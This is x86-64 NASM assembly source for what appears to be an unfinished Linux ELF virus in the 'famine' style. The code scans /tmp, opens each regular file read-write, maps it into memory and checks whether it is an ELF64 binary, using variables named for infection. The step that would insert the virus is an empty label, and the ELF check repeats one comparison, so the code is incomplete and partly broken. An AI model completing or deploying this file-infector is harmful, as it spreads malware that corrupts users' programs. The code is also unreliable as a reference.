%include "famine.inc"

BUF_SIZE    equ 1024
LOCAL_VARS  equ 1024

bits 64
default rel
global _start
section .text

strlen:         xor         rax, rax
.loop:          cmp         byte [rax + rdi], 0
                jz          .done
                inc         rax
                jmp         .loop
.done:          ret


puts:           call        strlen
                mov         rdx, rax
                mov         rsi, rdi
                mov         rdi, 1
                mov         rax, __NR_write
                syscall
                ret

_host:          lea         rdi, [rel hello]
                call        puts

                xor         rdi, rdi
                mov         rax, __NR_exit
                syscall
hello           db          "hello world",33,10,0
                times 128 - $ + strlen db 0x90



_start:
                mov         rdx, [rel pie_address]
                mov         rax, [rel entry]
                test        rdx, rdx
                jz          .entry_ready
                call        .delta
.delta:         pop         rcx
                sub         rcx, .delta - _start
                sub         rcx, rdx
                add         rax, rcx
.entry_ready:
                push        rax

                lea         rdi, [rel slash_tmp]
                mov         rsi, O_RDONLY | O_DIRECTORY
                mov         rax, __NR_open
                syscall
                test        rax, rax
                jl          return

                mov         [rel directory_fd], rax

                mov         rdi, rax
                mov         rax, __NR_fchdir
                syscall
                test        rax, rax
                jl          return

                lea         rax, [rsp - (BUF_SIZE + LOCAL_VARS)]
                mov         [rel getdents_buf], rax

scandir:        mov         rdx, BUF_SIZE
                mov         rsi, [rel getdents_buf]
                mov         rdi, [rel directory_fd]
                mov         rax, __NR_getdents64
                syscall
                test        rax, rax
                jle         .close

                mov         [rel getdents_size], rax            ; nread from getdents64
                xor         rdx, rdx
                mov         [rel getdents_idx], rdx

.file:          mov         rdi, [rel getdents_buf]
                add         rdi, [rel getdents_idx]

                cmp         byte [rdi + 18], DT_REG
                jne         .next

                add         rdi, 19                             ; d_name[]
                call        process

.next:          mov         rdi, [rel getdents_buf]
                add         rdi, [rel getdents_idx]
                movzx       rax, word [rdi + 16]                ; d_reclen
                add         rax, [rel getdents_idx]
                mov         [rel getdents_idx], rax
                mov         rdx, [rel getdents_size]
                cmp         rax, rdx
                jl          .file
                jmp         scandir

.close:         mov         rdi, [rel directory_fd]
                mov         rax, __NR_close
                syscall
return:
                pop         rax
                jmp         rax

process:                                                         ; expecting filename in rdi
                mov         rsi, O_RDWR
                mov         rax, __NR_open
                syscall
                test        rax, rax
                jl          .return

                mov         [rel infect_fd], rax

                lea         rsi, [rsp - 256]                    ; buf
                mov         rdi, [rel infect_fd]
                mov         rax, __NR_fstat
                syscall
                cmp         rax, 0
                jnz         .close

                mov         rax, qword [rsp - (256-48)]         ; st_size
                mov         [rel infect_fsize], rax

                xor         r9, r9
                mov         r8, [rel infect_fd]
                mov         r10, MAP_SHARED
                mov         rdx, PROT_READ | PROT_WRITE
                mov         rsi, rax
                xor         rdi, rdi
                mov         rax, __NR_mmap
                syscall
                cmp         rax, -4095
                jae         .close

                mov         [rel infect_mem], rax
                mov         rdi, rax
                call        is_valid_elf64
                cmp         rax, 1
                jnz         .unmap


.unmap:         mov         rdi, [rel infect_mem]
                mov         rsi, [rel infect_fsize]
                mov         rax, __NR_munmap
                syscall

.close:         mov         rdi, [rel infect_fd]
                mov         rax, __NR_close
                syscall
.return:        ret

is_valid_elf64:                                                 ; expecing data in rdi
                xor         rax, rax                            ; result in rax; 1 = valid
                cmp         qword [rdi + 8], rax
                jnz         .return
                mov         rdx, ELF_SYSV
                cmp         qword [rdi], rdx
                jz          .continue
                mov         rdx, ELF_SYSV
                cmp         qword [rdi], rdx
                jnz         .return
.continue:      mov         rdx, ELF64_ET_DYN
                cmp         qword [rdi + 16], rdx
                jz          .ok
                mov         rdx, ELF64_ET_EXEC
                cmp         qword [rdi + 16], rdx
                jnz         .return
.ok:            inc         rax
.return:        ret

insert:                                                         ; expecting data in rdi


directory_fd    dq          -1
getdents_buf    dq          -1
getdents_size   dq          -1
getdents_idx    dq          -1
infect_fd       dq          -1
infect_fsize    dq          -1
infect_mem      dq          -1



slash_tmp   db "/tmp",0
pie_address dq _start
entry       dq _host
_finish     equ $
